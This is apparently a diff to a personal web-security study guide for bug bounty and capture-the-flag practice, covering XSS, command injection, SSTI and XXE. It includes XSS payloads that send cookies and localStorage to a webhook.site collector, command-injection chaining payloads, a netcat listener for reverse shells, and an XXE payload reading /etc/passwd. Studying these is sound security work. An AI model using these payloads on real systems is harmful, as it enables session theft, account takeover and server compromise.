@@ -67,14 +67,74 @@ But here we don't want to use strings that we provide, we want strings provided 
 - `sqlmap` has an option for **Second Order SQL Testing** 
 
 # Cross-Site Scripting (XSS)
-- It's a vulnerability that let's us executes JavaScript code in a victim's browser, and often gives us control over the app for that user
+- It's a vulnerability that let's us executes JavaScript code in a victim's browser, and often gives us control over the app for that user.
 ## Types :
 1. ***Reflected*** > When the script we're injecting comes from the current HTTP request : `our script is included in the request` 
 	- It's limiting since we can only target ourselves
 2. ***Stored*** > When the payload is stored in the DB or something and then we can retrieve it later.
 3. ***DOM-Based*** > When the client-side has some vulnerable JavaScript that uses untrusted input  instead of having a vulnerability serve-side
-	- Everything happens locally in the browser.
+	- Everything happens locally in the browser : so when you take a look at the `Network` section in the dev tools, and you send your payload, the page doesn't get refreshed.
 
 ## Testing 
-- It's better to not use `alert()` as it often gets filtered, instead use : `print()` > which will pop up a print box. or `prompt()` > which will pop up a prompt box  
+- It's better to test for `HTML injection` first, since if it works `XSS injection` will work.
+- It's better to not use `alert()` as it often gets filtered, instead use : `print()` > which will pop up a print box. or `prompt()` > which will pop up a prompt box.
+- We can also use `A to B testing` to test for stored XSS : it's helpful to use containers ( the best method in my opinion is using the [Firefox multi-account containers](https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/)). 
+###  Very Basic payloads :
+- `<script>prompt(1)</script>`
+- `<img src=x onerror=prompt()>`
+- `<img src=x onerror="window.location.href = '<evil.com>'"`
+- To get for example another user's or admin's cookie we can use a webhook :
+	1. Use `netcat`, `collaborator` in burp or a website like `webhook.site` to receive the response. Just know that we should not be using third party websites if we're doing `bugbounty or pentest`, instead we can use a `ec2 instance` or if we're `using vpn we can just use our local machine`
+	
+	2. Syntax vary when it come to advanced Payloads : this is a payload that i used in a CTF challenge in one of my favorite platforms : [BugForge](https://bugforge.io/) , you can find the full documentation on my [Labs-Documentation](https://github.com/VOIDPACKET-VP/Labs-Documentation/blob/main/bugForge/Stored%20Cross-Site%20Scripting%20(XSS)%20to%20Account%20Takeover.md) repo : 
+		- `<img src=x onerror="fetch('https://webhook.site/YOUR-ID?test=execute&cookie='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage)));" `
+		- `<script>var i = new Image; i.src = "https://webhook.site/YOUR-ID/?"+ document.cookie;</script>`
+- Obviously learning `JavaScript` is very important if you want to level up your payload crafting skills, some of the best resources to learn it are : [Scrimba](https://scrimba.com/t0js) , [JavaScript Mastery](https://jsmastery.com) etc.
+- More can be found in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo and [HackTricks](https://book.hacktricks.wiki/en/index.html)
+# Command Injection (OS)
+- It's a very serious vulnerability, if we find it we can often compromise the entire application and the host.
+## Why it happens
+- The app is taking user input and passing it to a function that executes it as code, one of those functions are : `eval()` _eval is evil_ .
 
+## Testing
+- When we think about command injection, we think about :
+	1. Can we chain commands ?
+	2. Is the command that's being used where our code is being appended, can we add something that gets executed ?
+
+## Basic payloads
+- `; whoami` 
+- `which php` //to check what PHP version is being used
+- `ls||id; ls ||id; ls|| id; ls || id` 
+- We can also add `#` to comment out what comes after our code > `; whoami ;#` 
+- You can find some `Reverse shell paylaods` on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) and [HackTricks](https://book.hacktricks.wiki/en/index.html), just know that you will need a listener : use `netcat` > `nc -nvlp <PORT>` .
+- NOTE THAT : ***Popping a shell*** is most of the times **OUT OF SCOPE** in bug bounties > so check the scope and rules of engagements of the program you're working on. 
+
+## Blind Command Injection
+- As every blind injection : we inject our code but the result don't get reflected back to us, so we can use some different payloads to test for it:
+	- `"sleep 10"`
+	- `https://webhook.site/YOUR-ID?q="<code-to-execute (e.g. sleep 10)>"` 
+
+
+# Server-Side Template Injection (SSTI)
+- So a template engine allows us to separate the ***Presentation Layer*** from the ***Logic Layer*** in our application.
+- Some popular template engines are :
+	1. Ginger2
+	2. Twig
+	3. Erb
+	4. Free Marker
+	5. etc.
+
+- ***NOTE*** : I've made a more deep guide on SSTI which i highly recommend you to check and read > [SSTI Solar Flares](https://github.com/VOIDPACKET-VP/VOIDPACKET-Web-Galaxies/blob/main/Cosmic%20Phenomena/SSTI%20Solar%20Flares.md), Since i won't be going over it here. THANK YOU.
+
+# XML External Entity injection (XXE)
+
+- Some apps use XML to transfer data. This format has a specification that contains potentially dangerous features and parsers that process the data vulnerably.
+- An external entity is a custom entity whose definition is outside the document and therefore needs to be located when the XML file is passed.
+- This is not something that we find often anymore, since teams have added patches and filters etc. but it's worth testing for if an app is accepting and passing XML.
+- Sometimes API endpoints might except XML data instead of JSON, situations like this are often overlooked and therefore greater bounty rewards.
+
+## Basic payloads :
+- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`
+
+# Insecure File Uploads
+- 
